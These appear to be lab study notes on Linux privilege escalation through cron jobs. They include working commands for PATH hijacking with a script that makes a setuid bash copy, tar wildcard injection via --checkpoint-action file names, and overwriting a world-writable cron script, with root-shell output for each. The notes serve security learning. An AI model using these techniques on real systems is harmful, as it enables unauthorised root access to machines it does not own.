Cron jobs are like scheduled tasks.  Things that have been set up to run for a specific time period, at a specific interval.  Payloads all the things has a good bit of stuff on this as well.

You also have things called Systemd timers.  They are pretty must the same thing.  You can check those with this command.

`systemctl list-timers --all`

Scheduling a backup to run is an example of a cron job.

`cat /etc/crontab`  - This will give you a good bit of info about different things running.

```
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

Here, we have the output.  Let's look at some exploits.  The bottom two, run every minute, indicated by the all asterisk.  


#### Via Cron Paths

`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

This is the order of items being checked for a command if it's not specifically noted.  I.e., with the bottom two listed, `overwrite.sh` would follow the PATH, left to right.  `compress.sh` is going to follow it's coded path of `/usr/local/bin/` and bypass the PATH variable altogether.

`ls -la /home/user` here will show that there is no `overwrite.sh` so we can make one and place it there and the system will run it as root every minute.

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`

And then....

`chmod +x /home/user/overwrite.sh`

And then give it a couple minutes to make sure that it ran and go check where you put the bash to see if it updated according to the date on the file.

Once you check the file (`ls -la /tmp` for this example), then run it.

```
TCM@debian:~$ /tmp/bash -p
bash-4.1# whoami
root
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```


#### Cron Wildcards

Here we're going to look at the bottom most line job.  So cat out the script to see what it does.

```
TCM@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Since there's a wildcard at the end of the last line (`*`), we can abuse that.  Upon checking it with `ls -la`, we find that we have read only access.

From the `/home/user` folder we can create a script.

```
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
TCM@debian:~$ chmod +x runme.sh 
TCM@debian:~$ ls
libcalc.c  myvpn.ovpn  overwrite.sh  runme.sh  tools
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\runme.sh
TCM@debian:~$ ls
--checkpoint=1  --checkpoint-action=exec=shrunme.sh  libcalc.c  myvpn.ovpn  overwrite.sh  runme.sh  tools
TCM@debian:~$ /tmp/bash -p
bash-4.1# whoami
root
```

Note: Writeup notes had this 7th line code working with `exec=sh\ runme.sh` as opposed to `exec=sh\runme.sh`.  Both may work but may want to try both.

This is kind of tar specific but basically because of the asterisk its taking the two checkpoints and running them as well.  When it does the `action` it creates that bash program as root and has it run as root.

#### Cron File Overwrites

`ls -la /usr/local/bin/overwrite.sh`

When we run this we see that everyone has read/write access to that shell file.  Because of this, we can actually overwrite the `overwrite.sh` file.

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`

This command will actually append (`>>`) the command part onto the end of overwrite.sh
